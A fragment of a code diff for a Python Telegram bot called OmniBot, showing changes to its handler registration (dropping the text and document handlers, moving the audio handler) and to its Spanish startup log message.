+    app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CallbackQueryHandler(callback_handler))
-    
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
     app.add_handler(MessageHandler(filters.VIDEO, handle_video))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(MessageHandler(filters.LOCATION, handle_location))
-    
     app.add_error_handler(error_handler)
-    
-    logger.info("✅ OmniBot iniciado")
+    logger.info("✅ OMNI Bot iniciado correctamente")
     app.run_polling()
 
 if __name__ == "__main__":
